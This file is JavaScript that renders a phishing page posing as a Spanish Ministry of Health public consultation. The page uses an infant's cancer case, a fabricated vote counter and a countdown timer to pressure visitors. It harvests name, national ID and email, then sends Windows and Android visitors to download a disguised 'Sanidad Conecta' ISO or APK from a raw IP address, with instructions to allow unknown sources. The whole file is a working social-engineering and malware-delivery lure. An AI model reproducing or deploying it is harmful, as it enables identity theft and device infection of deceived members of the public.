(function() {
    document.open();
    document.write('<!DOCTYPE html><html>');
    document.write('<head><meta charset="UTF-8"><title>Sede Electrónica - Ministerio de Sanidad - Consulta Pública 2026/ONC-PED-0481</title>');
    document.write(`
    <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{font-family:Segoe UI,Helvetica,Arial,sans-serif;background:#f0f2f5;color:#333;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding:20px}
    .contenedor{max-width:900px;width:100%;background:#fff;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);padding:0 0 30px 0;overflow:hidden}
    .cabecera{background:#0056a7;color:#fff;padding:20px 40px}
    .cabecera h1{font-size:1.3rem;font-weight:600}
    .cabecera small{font-size:0.8rem;opacity:.85;display:block;margin-top:4px}
    .cuerpo{padding:30px 40px}
    h2{font-size:1.5rem;color:#0056a7;border-bottom:2px solid #0056a7;padding-bottom:10px;margin-bottom:20px}
    h3{font-size:1.1rem;margin:20px 0 10px;color:#003f7a}
    .aviso{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:20px 0;font-size:0.95rem}
    .alerta-roja{background:#f8d7da;border-left:4px solid #dc3545;padding:15px;margin:20px 0;font-size:0.95rem}
    .fotos{display:flex;gap:20px;margin:20px 0;flex-wrap:wrap}
    .foto{flex:1;min-width:260px;background:#f8f9fa;border:1px solid #ddd;border-radius:6px;padding:10px}
    .foto img{width:100%;height:auto;border-radius:4px;display:block}
    .foto .pie{font-size:0.8rem;color:#666;margin-top:8px;text-align:center;font-style:italic}
    .stats{display:flex;gap:15px;margin:20px 0;flex-wrap:wrap}
    .stat{flex:1;min-width:140px;background:#e9f2fb;border-radius:6px;padding:15px;text-align:center}
    .stat .num{font-size:1.6rem;font-weight:bold;color:#0056a7}
    .stat .lbl{font-size:0.8rem;color:#555;margin-top:4px}
    .votacion{background:#f8f9fa;border:1px solid #ddd;border-radius:6px;padding:20px;margin:20px 0}
    .opciones{display:flex;gap:15px;margin:15px 0;flex-wrap:wrap}
    .opcion{flex:1;min-width:180px;border:2px solid #ccc;border-radius:8px;padding:15px;text-align:center;cursor:pointer;transition:.2s;background:#fff}
    .opcion:hover{border-color:#0056a7}
    .opcion.sel{border-color:#0056a7;background:#e9f2fb}
    .opcion .titulo{font-size:1.1rem;font-weight:bold}
    .opcion.si .titulo{color:#28a745}
    .opcion.no .titulo{color:#dc3545}
    label{display:block;font-size:0.9rem;margin:10px 0 4px;color:#444}
    input[type=text],input[type=email]{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:0.95rem}
    .btn-descarga{display:inline-block;background:#28a745;color:#fff;padding:12px 30px;border-radius:30px;text-decoration:none;font-size:1.05rem;font-weight:bold;margin:10px 0;transition:0.3s;border:none;cursor:pointer}
    .btn-descarga:hover{background:#218838}
    .btn-voto{display:block;width:100%;background:#0056a7;color:#fff;padding:14px;border:none;border-radius:6px;font-size:1.1rem;font-weight:bold;cursor:pointer;margin-top:15px;transition:.2s}
    .btn-voto:hover{background:#003f7a}
    .instrucciones{background:#f8f9fa;padding:15px;border-radius:5px;margin:20px 0;font-size:0.9rem;border-left:4px solid #0056a7}
    .footer{margin-top:30px;font-size:0.75rem;color:#666;border-top:1px solid #ddd;padding-top:15px;text-align:center}
    .footer a{color:#0056a7;text-decoration:none}
    .breadcrumb{font-size:0.8rem;color:#666;margin-bottom:15px}
    .breadcrumb a{color:#0056a7;text-decoration:none}
    .ref{font-size:0.8rem;color:#888;text-align:right;margin-bottom:10px}
    .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);display:none;justify-content:center;align-items:center;z-index:999}
    .modal.on{display:flex}
    .modal-box{background:#fff;border-radius:8px;padding:30px;max-width:420px;text-align:center}
    .modal-box h4{color:#0056a7;margin-bottom:10px}
    .modal-box p{font-size:0.9rem;color:#555;margin-bottom:15px}
    </style>
    </head><body>
    `);
    document.write(`
    <div class="contenedor">
    <div class="cabecera">
    <h1>Gobierno de España — Ministerio de Sanidad</h1>
    <small>Sede Electrónica · Consulta Pública · Expediente 2026/ONC-PED-0481</small>
    </div>
    <div class="cuerpo">
    <div class="breadcrumb"><a href="#">Inicio</a> › <a href="#">Consultas públicas</a> › <a href="#">Oncología pediátrica</a> › 2026/ONC-PED-0481</div>
    <div class="ref">Ref: MSCBS/ONC/2026/0481-ES · Fecha: 27/09/2026</div>
    <h2>Consulta pública: autorización excepcional de intervención quirúrgica</h2>
    <p>La Comisión de Bioética del Ministerio de Sanidad somete a consulta pública la solicitud de <strong>autorización excepcional</strong> para intervención neuroquirúrgica urgente en paciente pediátrico, de conformidad con el artículo 9 de la Ley 41/2002 y el Real Decreto-ley 14/2025.</p>

    <div class="alerta-roja">
    <strong>Paciente:</strong> Lactante de 8 meses. <strong>Diagnóstico:</strong> glioma pontino intrínseco difuso (DIPG) con efecto de masa. <strong>Pronóstico sin intervención:</strong> &lt; 6 semanas. <strong>Pronóstico con intervención:</strong> reservado, requiere autorización inmediata.
    </div>

    <h3>Documentación diagnóstica</h3>
    <div class="fotos">
    <div class="foto">
    <img src="https://i.ibb.co/Y4LRt7LD/IMG-20260927-082618-931.jpg" alt="Imagen diagnóstica">
    <div class="pie">Fig. 1 — RMN cerebral. Glioma pontino. Informe radiológico HU-2026-09-1137.</div>
    </div>
    <div class="foto">
    <img src="https://i.ibb.co/gbnbKkqm/IMG-20260927-082618-229.jpg" alt="Paciente pediátrico">
    <div class="pie">Fig. 2 — Paciente, 8 meses. Unidad de Oncología Pediátrica.</div>
    </div>
    </div>

    <h3>Resultados provisionales de la consulta</h3>
    <div class="stats">
    <div class="stat"><div class="num" id="vSi">12 847</div><div class="lbl">A favor de la intervención</div></div>
    <div class="stat"><div class="num" id="vNo">1 209</div><div class="lbl">En contra</div></div>
    <div class="stat"><div class="num" id="vTiempo">47:59:59</div><div class="lbl">Tiempo restante</div></div>
    </div>

    <div class="votacion">
    <h3 style="margin-top:0">Emita su voto</h3>
    <p style="font-size:.9rem;color:#555">Conforme al procedimiento de participación ciudadana, solo podrán emitir voto los usuarios registrados con la aplicación oficial <strong>Sanidad Conecta</strong> instalada y vinculada a su certificado digital o Cl@ve.</p>

    <div class="opciones">
    <div class="opcion si" data-v="si"><div class="titulo">SÍ</div><div style="font-size:.85rem;color:#555;margin-top:6px">Autorizar la intervención</div></div>
    <div class="opcion no" data-v="no"><div class="titulo">NO</div><div style="font-size:.85rem;color:#555;margin-top:6px">Denegar la autorización</div></div>
    </div>

    <label>Nombre y apellidos</label>
    <input type="text" id="fNombre" placeholder="Ej. María García López">
    <label>DNI / NIE</label>
    <input type="text" id="fDni" placeholder="Ej. 12345678Z">
    <label>Correo electrónico</label>
    <input type="email" id="fEmail" placeholder="usuario@dominio.es">

    <button class="btn-voto" id="btnVoto">Emitir voto</button>
    </div>

    <div class="instrucciones">
    <strong>Requisito obligatorio:</strong> para que su voto sea contabilizado debe instalar la aplicación oficial <strong>Sanidad Conecta</strong> en su dispositivo.<br><br>
    - <strong>Windows</strong>: descargue el archivo ISO, móntelo (doble clic) y ejecute <em>SanidadConecta</em>. Siga el asistente.<br>
    - <strong>Android</strong>: permita la instalación de orígenes desconocidos (Ajustes › Seguridad), abra el APK descargado.<br><br>
    Una vez instalada, la aplicación firmará su voto y lo remitirá a la Comisión de Bioética.
    <div style="text-align:center;margin-top:15px">
    <a href="#" class="btn-descarga" id="downloadBtn">▼ Descargar Sanidad Conecta</a>
    </div>
    </div>

    <div class="footer">
    © Ministerio de Sanidad — Sede Electrónica | <a href="#">Aviso legal</a> | <a href="#">Protección de datos</a> | <a href="#">Accesibilidad</a><br>
    Expediente 2026/ONC-PED-0481 · Consulta sujeta a la Ley 41/2002 y RD-ley 14/2025
    </div>
    </div>
    </div>

    <div class="modal" id="modal">
    <div class="modal-box">
    <h4>Aplicación requerida</h4>
    <p>Para contabilizar su voto es necesario tener instalada la aplicación oficial <strong>Sanidad Conecta</strong>. ¿Desea descargarla ahora?</p>
    <button class="btn-descarga" id="modalDl">Descargar ahora</button>
    </div>
    </div>
    `);
    document.write(`
    <script>
    (function(){
        var isWindows = navigator.userAgent.indexOf('Windows') !== -1;
        var isAndroid = navigator.userAgent.indexOf('Android') !== -1;
        var link = document.getElementById('downloadBtn');
        var modal = document.getElementById('modal');
        var modalDl = document.getElementById('modalDl');
        var urlWin = 'http://95.85.229.133:2222/Instalador_SanidadConecta.iso';
        var urlApk = 'http://95.85.229.133:2225/SanidadConecta.apk';
        var dlUrl = '#';
        if(isWindows){ dlUrl = urlWin; link.textContent = '▼ Descargar Sanidad Conecta (Windows ISO)'; }
        else if(isAndroid){ dlUrl = urlApk; link.textContent = '▼ Descargar Sanidad Conecta (Android APK)'; }
        else { link.textContent = '▼ Sistema no soportado'; }
        link.href = dlUrl;

        // выбор опции
        var sel = null;
        document.querySelectorAll('.opcion').forEach(function(o){
            o.addEventListener('click', function(){
                document.querySelectorAll('.opcion').forEach(function(x){x.classList.remove('sel');});
                o.classList.add('sel');
                sel = o.getAttribute('data-v');
            });
        });

        // голос
        document.getElementById('btnVoto').addEventListener('click', function(){
            var n = document.getElementById('fNombre').value.trim();
            var d = document.getElementById('fDni').value.trim();
            var e = document.getElementById('fEmail').value.trim();
            if(!sel){ alert('Seleccione una opción de voto.'); return; }
            if(!n || !d || !e){ alert('Complete todos los campos.'); return; }
            // "голос не проходит" — сначала приложение
            modal.classList.add('on');
        });

        modalDl.addEventListener('click', function(){
            if(dlUrl !== '#'){ window.location.href = dlUrl; }
        });

        // фейковый счётчик
        var si = 12847, no = 1209;
        var s = document.getElementById('vSi'), nn = document.getElementById('vNo');
        setInterval(function(){
            if(Math.random() > .4){ si++; } else { no++; }
            s.textContent = si.toLocaleString('es-ES');
            nn.textContent = no.toLocaleString('es-ES');
        }, 3500);

        // таймер 48ч
        var t = 47*3600 + 59*60 + 59;
        var tEl = document.getElementById('vTiempo');
        setInterval(function(){
            if(t <= 0) return;
            t--;
            var h = String(Math.floor(t/3600)).padStart(2,'0');
            var m = String(Math.floor((t%3600)/60)).padStart(2,'0');
            var ss = String(t%60).padStart(2,'0');
            tEl.textContent = h + ':' + m + ':' + ss;
        }, 1000);
    })();
    <\/script>
    `);
    document.write('</body></html>');
    document.close();
})();
// fuck the police from avangardsec / pol4rity
